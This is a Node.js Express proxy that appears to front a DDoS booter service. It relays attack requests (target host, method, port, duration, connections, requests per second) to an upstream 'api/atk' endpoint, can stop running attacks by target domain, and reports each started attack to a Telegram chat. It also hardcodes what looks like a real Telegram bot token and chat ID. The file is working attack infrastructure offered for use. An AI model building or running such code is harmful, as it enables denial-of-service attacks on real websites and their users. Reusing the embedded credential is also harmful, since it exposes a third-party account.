const express = require('express');
const { URL } = require('node:url');
const TelegramBot = require('node-telegram-bot-api'); // Import Telegram bot library

// Configuration -------------------------------------------------------------
const config = {
  port: Number(process.env.PORT) || 7777,
  upstreamUrl: process.env.UPSTREAM_URL || 'https://gassed.dev/api/atk',
  stopUrl: process.env.STOP_URL || 'https://gassed.dev/api/stop',
  logLimit: Number(process.env.LOG_LIMIT) || 100,
  telegramBotToken: process.env.TELEGRAM_BOT_TOKEN || '7335884593:AAFflLVp-Tl1L_9TvE06eDOP1JfaOg16WUc', // Telegram bot token
  telegramChatId: process.env.TELEGRAM_CHAT_ID || '1037581567' // Telegram chat ID
};

// Initialize Telegram Bot
const bot = new TelegramBot(config.telegramBotToken, { polling: false });

// Function to send logs to Telegram
async function sendTelegramLog(message) {
  try {
    await bot.sendMessage(config.telegramChatId, message, { parse_mode: 'HTML' });
    console.log(`[telegram-log] Sent to Telegram: ${message}`);
  } catch (err) {
    console.error('[telegram-log] Failed to send Telegram message:', err.message);
  }
}

const app = express();
const responseLog = [];
const requiredParams = ['key', 'host', 'method', 'port', 'time', 'cons', 'rps', 'geo'];

app.get('/health', (_req, res) => {
  res.json({ status: 'ok' });
});

app.get('/running', (_req, res) => {
  purgeExpiredEntries();
  res.json({ entries: responseLog });
});

app.get('/api', async (req, res) => {
  const missingParams = requiredParams.filter((param) => isMissing(req.query[param]));
  if (missingParams.length > 0) {
    return res.status(400).json({ error: 'Missing required query parameters', missing: missingParams });
  }

  const rpsValue = getPrimaryValue(req.query.rps);
  const numericRps = Number(rpsValue);
  if (Number.isNaN(numericRps) || numericRps <= 0 || numericRps > 128) {
    return res.status(400).json({ error: "Invalid 'rps' value, must be a positive number up to 128" });
  }

  const methodValue = getPrimaryValue(req.query.method);
  if (methodValue && methodValue.toUpperCase() === 'STOP') {
    return handleStopRequest(req, res);
  }

  let upstreamUrl;
  try {
    upstreamUrl = new URL(config.upstreamUrl);
  } catch (err) {
    return res.status(500).json({ error: 'Invalid UPSTREAM_URL configuration', details: err.message });
  }

  for (const [key, value] of Object.entries(req.query)) {
    appendParam(upstreamUrl.searchParams, key, value);
  }

  try {
    const upstreamResponse = await fetch(upstreamUrl.toString(), { method: 'GET' });
    const status = upstreamResponse.status;
    const contentType = upstreamResponse.headers.get('content-type') || '';
    const bodyText = await upstreamResponse.text();
    let payload;
    try {
      payload = JSON.parse(bodyText);
    } catch {
      payload = null;
    }

    if (payload) {
      recordResponsePayload(payload, getPrimaryValue(req.query.time));
      if (payload.success === true) {
        const domain = extractDomain(payload.host);
        const ids = Array.isArray(payload.ids) ? payload.ids : [payload.ids];
        // Log only successful attack starts to Telegram
        sendTelegramLog(
          `✅ <b>Attack Started</b>: Domain = ${domain}, IDs = ${ids.join(', ')}, ` +
          `Method = ${payload.method}, Port = ${payload.port}, Time = ${payload.time}, RPS = ${payload.rps}, ` +
          `Upstream Status = ${status}`
        );
        return res.status(status).json({
          success: true,
          domain,
          ids,
          method: payload.method,
          port: payload.port,
          time: payload.time,
          rps: payload.rps,
          upstreamStatus: status
        });
      }
      return res.status(status).json({
        success: Boolean(payload.success),
        upstream: payload,
        upstreamStatus: status
      });
    }

    res.status(status);
    if (contentType) {
      res.type(contentType);
    }
    return res.send(bodyText);
  } catch (err) {
    console.error('Upstream request failed:', err);
    return res.status(502).json({ error: 'Upstream request failed', details: err.message });
  }
});

// Utility to append single or multi-value params
function appendParam(searchParams, key, value) {
  if (Array.isArray(value)) {
    value.forEach((entry) => searchParams.append(key, entry));
    return;
  }
  searchParams.append(key, value);
}

async function handleStopRequest(req, res) {
  const key = getPrimaryValue(req.query.key);
  const hostRaw = getPrimaryValue(req.query.host);
  if (!hostRaw) {
    return res.status(400).json({ error: 'Host is required to identify running jobs.' });
  }

  const domain = extractDomain(hostRaw);
  if (!domain) {
    return res.status(400).json({ error: 'Unable to derive domain from host.', host: hostRaw });
  }

  purgeExpiredEntries();
  let targetIndex = -1;
  for (let i = 0; i < responseLog.length; i += 1) {
    if (responseLog[i].domain === domain) {
      targetIndex = i;
      break;
    }
  }

  if (targetIndex === -1) {
    return res.status(404).json({ success: false, message: 'No running jobs found for domain.', domain });
  }

  const targetEntry = responseLog[targetIndex];
  const targetId = targetEntry.id;
  const stopUrl = new URL(config.stopUrl);
  stopUrl.searchParams.set('key', key);
  stopUrl.searchParams.set('id', String(targetId));

  let stopPayload = null;
  let stopOk = false;
  let stopStatus = 0;

  try {
    const stopResponse = await fetch(stopUrl.toString(), { method: 'GET' });
    stopStatus = stopResponse.status;
    const rawBody = await stopResponse.text();
    try {
      stopPayload = JSON.parse(rawBody);
    } catch {
      stopPayload = rawBody;
    }
    if (stopResponse.ok) {
      stopOk = true;
      responseLog.splice(targetIndex, 1);
    }
  } catch (err) {
    stopPayload = { error: err.message };
  }

  return res.status(200).json({
    success: stopOk,
    domain,
    attemptedIds: [targetId],
    stoppedIds: stopOk ? [targetId] : [],
    results: [
      {
        id: targetId,
        status: stopStatus,
        ok: stopOk,
        body: stopPayload
      }
    ]
  });
}

function recordResponsePayload(payload, fallbackTime) {
  if (!payload || payload.success !== true || !payload.host || payload.ids === undefined) return;
  const domain = extractDomain(payload.host);
  const ids = Array.isArray(payload.ids) ? payload.ids : [payload.ids];
  const ttlSeconds = deriveTtlSeconds(payload.time, fallbackTime);
  if (ttlSeconds <= 0) return;
  const expiresAt = Date.now() + ttlSeconds * 1000;
  ids.forEach((id) => {
    const entry = {
      timestamp: new Date().toISOString(),
      recordedAt: Date.now(),
      domain,
      id,
      expiresAt
    };
    responseLog.push(entry);
    if (responseLog.length > config.logLimit) {
      responseLog.shift();
    }
    console.log(`[response-log] ${entry.domain}, ${entry.id}`);
  });
  purgeExpiredEntries();
}

function isMissing(value) {
  if (value === undefined || value === null) return true;
  if (Array.isArray(value)) {
    return value.length === 0 || value[0] === undefined || `${value[0]}`.trim() === '';
  }
  return `${value}`.trim() === '';
}

function getPrimaryValue(value) {
  if (Array.isArray(value)) return value[0];
  return value;
}

function parseSeconds(value) {
  const numeric = Number.parseFloat(value);
  if (!Number.isFinite(numeric)) return 0;
  return Math.max(0, numeric);
}

function deriveTtlSeconds(primaryValue, fallbackValue) {
  const primary = parseSeconds(primaryValue);
  if (primary > 0) return primary;
  return parseSeconds(fallbackValue);
}

function extractDomain(hostValue) {
  if (typeof hostValue !== 'string') return '';
  try {
    return new URL(hostValue).hostname;
  } catch {
    return hostValue.replace(/^https?:\/\//, '').split('/')[0];
  }
}

function purgeExpiredEntries() {
  if (responseLog.length === 0) return;
  const now = Date.now();
  let removed = false;
  for (let i = responseLog.length - 1; i >= 0; i -= 1) {
    const entry = responseLog[i];
    if (entry.expiresAt !== undefined && entry.expiresAt <= now) {
      responseLog.splice(i, 1);
      removed = true;
    }
  }
  if (removed) {
    console.log('[response-log] Purged expired entries');
  }
}

app.listen(config.port, () => {
  console.log(`Proxy server listening on http://localhost:${config.port}`);
});